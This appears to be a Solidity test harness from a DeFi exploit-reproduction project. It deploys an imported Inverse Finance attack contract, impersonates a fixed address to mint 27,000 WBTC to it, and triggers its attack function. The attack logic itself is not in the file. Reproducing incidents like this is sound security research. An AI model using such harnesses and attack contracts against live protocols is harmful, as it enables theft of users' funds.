// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;

import "ds-test/test.sol";
import "../attack.sol";
import "../stdlib.sol";
import "../Vm.sol";
import "../CheatCodes.sol";


contract attackTester is DSTest, stdCheats {
    InverseFi_attack attackContract;
    Vm public constant vm = Vm(HEVM_ADDRESS);
    CheatCodes cheats = CheatCodes(HEVM_ADDRESS);

    constructor() {
        attackContract = new InverseFi_attack();
        cheats.startPrank(0xCA06411bd7a7296d7dbdd0050DFc846E95fEBEB7);
        IWBTC WBTC = IWBTC(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
        WBTC.mint(address(attackContract), 27000 * 10 ** 8 );
    }

    function testExample() public {
      attackContract.attack();
    }

}